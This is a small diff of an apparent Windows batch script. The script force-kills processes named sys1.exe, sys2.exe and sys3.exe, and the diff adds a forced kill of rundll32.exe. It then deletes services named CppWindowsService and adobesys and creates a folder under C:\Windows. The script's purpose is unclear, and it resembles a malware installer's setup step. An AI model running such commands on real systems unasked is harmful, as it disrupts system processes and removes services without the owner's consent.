@@ -1,6 +1,7 @@
 taskkill /f /im sys1.exe
 taskkill /f /im sys2.exe
 taskkill /f /im sys3.exe
+taskkill /f /im rundll32.exe
 sc delete CppWindowsService
 sc delete adobesys
 mkdir c:\windows\hp
